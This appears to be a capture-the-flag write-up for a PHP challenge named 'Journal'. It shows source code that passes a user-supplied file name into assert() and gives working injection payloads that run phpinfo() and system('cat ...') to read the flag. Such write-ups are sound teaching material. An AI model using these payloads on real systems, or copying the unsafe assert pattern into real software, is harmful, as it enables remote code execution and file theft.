### Challenge - Journal

*Description:*
```
dear diary, there is no LFI in this app
```

The relevant source code is given below, it uses PHP's vulnerable assert() function to check for `..` in file name.

```
if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");

```


### Solution

Apparently, the assert function of PHP is vulnerable to RCE by bypassing the `'` of the parameter.
We tried bypassing `'` of the `$file` in assert by using the command:
```
file=file1.txt'.phpinfo().'
```
And it works! RCE obtained.

Now we just read the contents of the directories and we found the flag file in the root folder. The final command to get the flag :
```
file=file1.txt'.system(%22cat%20../../../flag-cARdaInFg6dD10uWQQgm.txt%22).'
```

<hr>
<hr>